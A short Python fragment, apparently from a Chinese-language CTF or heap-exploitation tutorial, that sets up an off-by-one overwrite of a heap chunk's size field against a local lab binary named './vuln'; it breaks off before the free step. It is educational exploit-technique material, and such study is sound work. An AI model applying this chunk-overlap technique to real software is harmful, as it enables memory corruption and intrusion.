p = process('./vuln')
# 假设程序有alloc、free、read功能
# 分配chunk
alloc(0x88, b'A'*0x88)  # idx 0
alloc(0x88, b'B'*0x88)  # idx 1
alloc(0x88, b'C'*0x88)  # idx 2

# off-by-one修改idx1的size
edit(0, b'A'*0x88 + b'\xb1')

# 释放idx0和idx2
